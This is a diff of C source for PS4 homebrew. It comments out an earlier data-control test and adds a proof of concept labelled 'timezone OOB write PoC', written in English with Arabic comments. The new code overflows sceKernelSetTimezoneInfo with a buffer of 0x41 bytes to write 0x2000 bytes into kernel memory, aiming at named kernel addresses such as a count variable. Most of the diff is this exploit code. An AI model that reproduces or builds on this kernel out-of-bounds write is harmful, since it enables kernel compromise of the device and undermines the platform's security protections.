@@ -1,3 +1,4 @@
+/*
 #include "ps4.h"
 
 int _main(struct thread *td) {
@@ -74,6 +75,39 @@ int _main(struct thread *td) {
         printf_debug("[+] DATA CONTROL CONFIRMED!\n");
     } else {
         printf_debug("[-] no match\n");
+    }
+
+    return 0;
+}
+*/
+
+#include "ps4.h"
+
+int _main(struct thread *td) {
+    UNUSED(td);
+
+    initKernel();
+    initLibc();
+    initNetwork();
+    jailbreak();
+    initSysUtil();
+
+    printf_debug("=== timezone OOB write PoC ===\n");
+
+    // 512 entry × 16 bytes = 0x2000 bytes
+    static uint8_t data[512 * 16];
+    memset(data, 0x41, sizeof(data));
+
+    // آخر entry تصل لـ DAT_ffffffff844d1790 (count)
+    // لو كتبنا 0x41414141 على count → نغيره!
+
+    int r = sceKernelSetTimezoneInfo(data, 512);
+    printf_debug("set_timezone r=%d\n", r);
+
+    if (r == 0) {
+        printf_debug("[+] wrote 0x2000 bytes to kernel!\n");
+        printf_debug("DAT_ffffffff844d1790 should be 0x41414141\n");
+        printf_debug("DAT_ffffffff844d1798 should be 0x4141414141414141\n");
     }
 
     return 0;
